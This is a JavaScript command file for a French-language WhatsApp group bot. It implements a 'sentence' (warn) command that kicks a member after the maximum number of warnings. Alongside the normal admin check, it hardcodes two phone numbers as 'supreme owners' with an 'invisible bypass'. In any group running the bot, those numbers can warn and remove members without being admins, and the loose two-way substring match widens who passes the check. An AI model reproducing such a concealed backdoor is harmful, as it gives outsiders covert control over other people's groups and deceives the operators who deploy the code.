/**
 * Warn Command - Warn a user
 * GhostG-X Edition
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const database = require('../../database');
const config = require('../../config');

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

module.exports = {
  name: 'sᴇɴᴛᴇɴᴄᴇ',
  aliases: ['warn', 'warning', 'punir', 'sentence', 'prevenir'],
  category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴀᴘᴘʟɪǫᴜᴇ ᴜɴᴇ sᴇɴᴛᴇɴᴄᴇ ᴀ̀ ᴜɴ ᴍᴇᴍʙʀᴇ',
  usage: '.sᴇɴᴛᴇɴᴄᴇ @user <reason>',
  groupOnly: true,
  adminOnly: true,
  botAdminNeeded: true,

  async execute(sock, msg, args, extra) {
    const { reply } = extra;
    const prefix = config.prefix || '^';

    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
      const supremeOwners = ['22651622652', '22665108174'];
      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));

      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
      if (!extra.isAdmin && !isMe) {
        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      let target;
      const ctx = msg.message?.extendedTextMessage?.contextInfo;
      const mentioned = ctx?.mentionedJid || [];

      if (mentioned && mentioned.length > 0) {
        target = mentioned[0];
      } else if (ctx?.participant && ctx.stanzaId && ctx.quotedMessage) {
        target = ctx.participant;
      } else {
        return reply(`*❌ ${toSmallCaps('veuillez mentionner ou repondre a l individu a sanctionner')} !*\n\n*ᴇxᴇᴍᴘʟᴇ :* \`${prefix}sᴇɴᴛᴇɴᴄᴇ @user <ʀᴀɪsᴏɴ>\`\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const reason = args.slice(mentioned.length > 0 ? 1 : 0).join(' ') || 'ᴀᴜᴄᴜɴᴇ ʀᴀɪsᴏɴ sᴘᴇ́ᴄɪғɪᴇ́ᴇ';

      // Cannot warn admins
      const foundParticipant = extra.groupMetadata.participants.find(
        p => (p.id === target || p.lid === target) && (p.admin === 'admin' || p.admin === 'superadmin')
      );

      if (foundParticipant) {
        return reply(`*❌ ${toSmallCaps('impossible d appliquer une sentence a un gardien')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
      }

      const warnings = database.addWarning(extra.from, target, reason);

      let text = `*╭╼━━━≪• sᴇɴᴛᴇɴᴄᴇ ᴇ́ᴍɪsᴇ •≫━━━╾╮*\n` +
                 `*┃* 👤 *${toSmallCaps('individu')} :* @${target.split('@')[0]}\n` +
                 `*┃* 📝 *${toSmallCaps('motif')} :* ${reason}\n` +
                 `*┃* ⚠️ *${toSmallCaps('sentences')} :* ${warnings.count}/${config.maxWarnings}\n\n`;

      if (warnings.count >= config.maxWarnings) {
        text += `*┃* ❌ *${toSmallCaps('l individu a atteint le seuil maximal de sentences et va etre exile')} !*\n\n` +
                `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;

        await sock.sendMessage(extra.from, {
          text,
          mentions: [target]
        }, { quoted: msg });

        if (extra.isBotAdmin) {
          await sock.groupParticipantsUpdate(extra.from, [target], 'remove');
          database.clearWarnings(extra.from, target);
        }
      } else {
        text += `*┃* ⚠️ *${toSmallCaps('la prochaine sentence entrainera un bannissement immediat')} !*\n\n` +
                `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;

        await sock.sendMessage(extra.from, {
          text,
          mentions: [target]
        }, { quoted: msg });
      }

    } catch (error) {
      console.error('Warn command error:', error);
      await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
    }
  }
};
